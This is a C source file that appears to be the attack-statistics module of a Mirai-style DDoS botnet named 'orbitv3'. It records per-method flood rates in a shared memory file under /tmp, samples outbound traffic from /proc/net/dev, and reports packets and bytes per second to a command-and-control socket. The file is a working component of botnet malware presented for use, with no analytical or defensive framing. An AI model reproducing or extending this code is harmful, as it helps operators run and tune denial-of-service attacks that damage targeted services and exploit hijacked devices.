#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <time.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include "includes.h"
#include "attack.h"
#define MAX_ACTIVE_ATTACKS 10
#define SHM_NAME "/tmp/orbitv3_stats"
struct attack_statistics {
    uint8_t method_id;
    uint64_t packets_sent;
    uint64_t bytes_sent;
    time_t start_time;
    time_t last_update;
    volatile uint64_t current_pps;
    volatile uint64_t current_bps;
    volatile uint64_t last_second_packets;
    volatile uint64_t last_second_bytes;
    time_t last_second_time;
};
struct shared_stats_header {
    volatile int stats_count;
    struct attack_statistics stats[MAX_ACTIVE_ATTACKS];
};
static struct shared_stats_header *shared_stats = NULL;
static int stats_fd = -1;
static int shm_fd = -1;
static uint8_t current_method_id = 0;
static uint64_t kernel_last_bytes = 0;
static uint64_t kernel_last_packets = 0;
static time_t kernel_last_time = 0;
static uint64_t kernel_last_usec = 0;
static void attack_stats_read_kernel(uint64_t *pps, uint64_t *bps) {
    *pps = 0;
    *bps = 0;
    FILE *f = fopen("/proc/net/dev", "r");
    if (f == NULL) {
        return;
    }
    char line[512];
    uint64_t total_bytes = 0;
    uint64_t total_packets = 0;
    if (fgets(line, sizeof(line), f) == NULL) {
        fclose(f);
        return;
    }
    if (fgets(line, sizeof(line), f) == NULL) {
        fclose(f);
        return;
    }
    while (fgets(line, sizeof(line), f) != NULL) {
        char *colon = strchr(line, ':');
        if (colon == NULL) {
            continue;
        }
        char *p = colon + 1;
        uint64_t rbytes, rpackets, rerrs, rdrop, rframe, rcompressed, rmulticast;
        uint64_t tbytes, tpackets, terrs, tdrop, tcollisions, tcarrier, tcompressed;
        if (sscanf(p, "%lu %lu %lu %lu %lu %lu %lu %lu %lu %lu %lu %lu %lu %lu",
                   &rbytes, &rpackets, &rerrs, &rdrop, &rframe, &rcompressed, &rmulticast,
                   &tbytes, &tpackets, &terrs, &tdrop, &tcollisions, &tcarrier, &tcompressed) >= 9) {
            total_bytes += tbytes;
            total_packets += tpackets;
        }
    }
    fclose(f);
    struct timeval tv;
    gettimeofday(&tv, NULL);
    time_t now = tv.tv_sec;
    uint64_t usec = (uint64_t)tv.tv_usec;
    if (kernel_last_time == 0) {
        kernel_last_bytes = total_bytes;
        kernel_last_packets = total_packets;
        kernel_last_time = now;
        kernel_last_usec = usec;
        return;
    }
    double time_diff = (double)(now - kernel_last_time) + ((double)usec - (double)kernel_last_usec) / 1000000.0;
    if (time_diff > 0.1) { 
        uint64_t bytes_diff = total_bytes - kernel_last_bytes;
        uint64_t packets_diff = total_packets - kernel_last_packets;
        if (bytes_diff > 1000000000000ULL || packets_diff > 1000000000ULL) {
            kernel_last_bytes = total_bytes;
            kernel_last_packets = total_packets;
            kernel_last_time = now;
            kernel_last_usec = usec;
            return;
        }
        if (time_diff > 0) {
            *bps = (uint64_t)((double)bytes_diff / time_diff);
            *pps = (uint64_t)((double)packets_diff / time_diff);
        }
    }
    kernel_last_bytes = total_bytes;
    kernel_last_packets = total_packets;
    kernel_last_time = now;
    kernel_last_usec = usec;
}
void attack_stats_init(int cnc_fd) {
    stats_fd = cnc_fd;
    shm_fd = open(SHM_NAME, O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        return;
    }
    size_t shm_size = sizeof(struct shared_stats_header);
    ftruncate(shm_fd, shm_size);
    shared_stats = (struct shared_stats_header *)mmap(NULL, shm_size, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (shared_stats == MAP_FAILED) {
        shared_stats = NULL;
        return;
    }
    if (shared_stats->stats_count == 0) {
        memset(shared_stats, 0, shm_size);
    }
}
void attack_stats_reinit(void) {
    if (shm_fd != -1) {
        close(shm_fd);
        shm_fd = -1;
    }
    if (shared_stats != NULL) {
        munmap(shared_stats, sizeof(struct shared_stats_header));
        shared_stats = NULL;
    }
    shm_fd = open(SHM_NAME, O_RDWR, 0666);
    if (shm_fd == -1) {
        return;
    }
    size_t shm_size = sizeof(struct shared_stats_header);
    shared_stats = (struct shared_stats_header *)mmap(NULL, shm_size, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (shared_stats == MAP_FAILED) {
        shared_stats = NULL;
    }
}
int attack_stats_add(uint8_t method_id) {
    if (shared_stats == NULL) {
        attack_stats_reinit();
        if (shared_stats == NULL) {
            return -1;
        }
    }
    if (shared_stats->stats_count >= MAX_ACTIVE_ATTACKS) {
        return -1;
    }
    for (int i = 0; i < shared_stats->stats_count; i++) {
        if (shared_stats->stats[i].method_id == method_id) {
            return i;
        }
    }
    int idx = shared_stats->stats_count++;
    shared_stats->stats[idx].method_id = method_id;
    shared_stats->stats[idx].packets_sent = 0;
    shared_stats->stats[idx].bytes_sent = 0;
    shared_stats->stats[idx].start_time = time(NULL);
    shared_stats->stats[idx].last_update = time(NULL);
    shared_stats->stats[idx].current_pps = 0;
    shared_stats->stats[idx].current_bps = 0;
    shared_stats->stats[idx].last_second_packets = 0;
    shared_stats->stats[idx].last_second_bytes = 0;
    shared_stats->stats[idx].last_second_time = time(NULL);
    return idx;
}
void attack_stats_set_method(uint8_t method_id) {
    current_method_id = method_id;
}
void attack_stats_inc(uint8_t method_id, uint64_t bytes) {
    if (shared_stats == NULL) {
        attack_stats_reinit();
        if (shared_stats == NULL) {
            return;
        }
    }
    if (method_id == 0) {
        method_id = current_method_id;
    }
    if (method_id == 0) {
        return;
    }
    for (int i = 0; i < shared_stats->stats_count; i++) {
        if (shared_stats->stats[i].method_id == method_id) {
            shared_stats->stats[i].last_second_packets++;
            shared_stats->stats[i].last_second_bytes += bytes;
            break;
        }
    }
}
void attack_stats_update(uint8_t method_id, uint64_t pps, uint64_t bps) {
    if (shared_stats == NULL) {
        return;
    }
    for (int i = 0; i < shared_stats->stats_count; i++) {
        if (shared_stats->stats[i].method_id == method_id) {
            shared_stats->stats[i].current_pps = pps;
            shared_stats->stats[i].current_bps = bps;
            shared_stats->stats[i].packets_sent += pps;
            shared_stats->stats[i].bytes_sent += bps;
            shared_stats->stats[i].last_update = time(NULL);
            break;
        }
    }
}
void attack_stats_tick(void) {
    if (shared_stats == NULL) {
        return;
    }
    time_t now = time(NULL);
    for (int i = 0; i < shared_stats->stats_count; i++) {
        if (now != shared_stats->stats[i].last_second_time) {
            shared_stats->stats[i].current_pps = shared_stats->stats[i].last_second_packets;
            shared_stats->stats[i].current_bps = shared_stats->stats[i].last_second_bytes;
            shared_stats->stats[i].packets_sent += shared_stats->stats[i].last_second_packets;
            shared_stats->stats[i].bytes_sent += shared_stats->stats[i].last_second_bytes;
            shared_stats->stats[i].last_second_packets = 0;
            shared_stats->stats[i].last_second_bytes = 0;
            shared_stats->stats[i].last_second_time = now;
            shared_stats->stats[i].last_update = now;
        } else {
            shared_stats->stats[i].current_pps = shared_stats->stats[i].last_second_packets;
            shared_stats->stats[i].current_bps = shared_stats->stats[i].last_second_bytes;
        }
    }
}
void attack_stats_remove(uint8_t method_id) {
    if (shared_stats == NULL) {
        return;
    }
    for (int i = 0; i < shared_stats->stats_count; i++) {
        if (shared_stats->stats[i].method_id == method_id) {
            for (int j = i; j < shared_stats->stats_count - 1; j++) {
                shared_stats->stats[j] = shared_stats->stats[j + 1];
            }
            shared_stats->stats_count--;
            break;
        }
    }
}
void attack_stats_send(void) {
    if (stats_fd == -1) {
        return;
    }
    uint64_t kernel_pps = 0;
    uint64_t kernel_bps = 0;
    attack_stats_read_kernel(&kernel_pps, &kernel_bps);
    if (shared_stats == NULL) {
        attack_stats_reinit();
        if (shared_stats == NULL) {
            if (kernel_pps > 0 || kernel_bps > 0) {
                uint8_t buf[2 + 1 + 9];
                int pos = 0;
                buf[pos++] = 0xFF;
                buf[pos++] = 0xFF;
                buf[pos++] = 1; 
                buf[pos++] = 0xFF; 
                buf[pos++] = (uint8_t)((kernel_pps >> 24) & 0xFF);
                buf[pos++] = (uint8_t)((kernel_pps >> 16) & 0xFF);
                buf[pos++] = (uint8_t)((kernel_pps >> 8) & 0xFF);
                buf[pos++] = (uint8_t)(kernel_pps & 0xFF);
                buf[pos++] = (uint8_t)((kernel_bps >> 24) & 0xFF);
                buf[pos++] = (uint8_t)((kernel_bps >> 16) & 0xFF);
                buf[pos++] = (uint8_t)((kernel_bps >> 8) & 0xFF);
                buf[pos++] = (uint8_t)(kernel_bps & 0xFF);
                uint16_t len = htons((uint16_t)(pos + 2));
                send(stats_fd, &len, sizeof(len), MSG_NOSIGNAL);
                send(stats_fd, buf, pos, MSG_NOSIGNAL);
            }
            return;
        }
    }
    if (shared_stats->stats_count > 0) {
        attack_stats_tick();
    }
    uint8_t count = shared_stats->stats_count;
    if (count == 0 && (kernel_pps > 0 || kernel_bps > 0)) {
        count = 1; 
    }
    if (count == 0) {
        return;
    }
    uint8_t buf[2 + 1 + count * 9];
    int pos = 0;
    buf[pos++] = 0xFF;
    buf[pos++] = 0xFF;
    buf[pos++] = count;
    if (shared_stats->stats_count > 0) {
        for (int i = 0; i < shared_stats->stats_count; i++) {
            buf[pos++] = shared_stats->stats[i].method_id;
            uint64_t pps = shared_stats->stats[i].current_pps;
            uint64_t bps = shared_stats->stats[i].current_bps;
            if (kernel_pps > 0 || kernel_bps > 0) {
                if (kernel_pps > 0) {
                    pps = kernel_pps / shared_stats->stats_count;
                }
                if (kernel_bps > 0) {
                    bps = kernel_bps / shared_stats->stats_count;
                }
            }
            buf[pos++] = (uint8_t)((pps >> 24) & 0xFF);
            buf[pos++] = (uint8_t)((pps >> 16) & 0xFF);
            buf[pos++] = (uint8_t)((pps >> 8) & 0xFF);
            buf[pos++] = (uint8_t)(pps & 0xFF);
            buf[pos++] = (uint8_t)((bps >> 24) & 0xFF);
            buf[pos++] = (uint8_t)((bps >> 16) & 0xFF);
            buf[pos++] = (uint8_t)((bps >> 8) & 0xFF);
            buf[pos++] = (uint8_t)(bps & 0xFF);
        }
    } else {
        buf[pos++] = 0xFF;
        buf[pos++] = (uint8_t)((kernel_pps >> 24) & 0xFF);
        buf[pos++] = (uint8_t)((kernel_pps >> 16) & 0xFF);
        buf[pos++] = (uint8_t)((kernel_pps >> 8) & 0xFF);
        buf[pos++] = (uint8_t)(kernel_pps & 0xFF);
        buf[pos++] = (uint8_t)((kernel_bps >> 24) & 0xFF);
        buf[pos++] = (uint8_t)((kernel_bps >> 16) & 0xFF);
        buf[pos++] = (uint8_t)((kernel_bps >> 8) & 0xFF);
        buf[pos++] = (uint8_t)(kernel_bps & 0xFF);
    }
    uint16_t len = htons((uint16_t)(pos + 2));
    send(stats_fd, &len, sizeof(len), MSG_NOSIGNAL);
    send(stats_fd, buf, pos, MSG_NOSIGNAL);
}
void attack_stats_get(uint8_t method_id, uint64_t *pps, uint64_t *bps) {
    *pps = 0;
    *bps = 0;
    if (shared_stats == NULL) {
        return;
    }
    for (int i = 0; i < shared_stats->stats_count; i++) {
        if (shared_stats->stats[i].method_id == method_id) {
            *pps = shared_stats->stats[i].current_pps;
            *bps = shared_stats->stats[i].current_bps;
            break;
        }
    }
}
